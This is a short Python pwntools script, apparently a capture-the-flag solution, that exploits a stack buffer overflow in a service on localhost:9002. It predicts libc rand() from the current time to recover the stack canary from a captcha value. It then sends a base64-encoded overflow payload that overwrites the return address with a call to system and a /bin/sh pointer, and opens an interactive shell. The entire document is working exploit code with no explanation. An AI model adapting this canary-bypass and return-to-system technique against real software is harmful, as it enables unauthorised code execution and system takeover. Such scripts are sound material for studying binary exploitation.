from pwn import *
import ctypes
import time

context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = (ctypes.c_uint,)
libc.rand.restype = ctypes.c_int

seed = int(time.time())
libc.srand(seed)

vals = [libc.rand() for _ in range(8)]

result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6]
print("result:", result)

p = remote('localhost', 9002)

p.recvuntil(b'captcha : ')
captcha = int(p.recv().decode())
p.sendline(str(captcha))
print("captcha:", captcha)

canary = captcha - result
canary = canary & 0xffffffff
canary = p32(canary)
print("canary:", canary)

call_system_addr = p32(0x8049187)
print("call system address:", call_system_addr)

binsh_addr = p32(0x804B3AC)
print("/bin/sh address:", binsh_addr)

payload = b'A' * 512 + canary + b'A' * 12 + call_system_addr + binsh_addr
payload = b64e(payload).encode() + b'/bin/sh\0'

p.recvuntil(b'Encode your data with BASE64 then paste me!\n')
p.sendline(payload)
p.interactive()
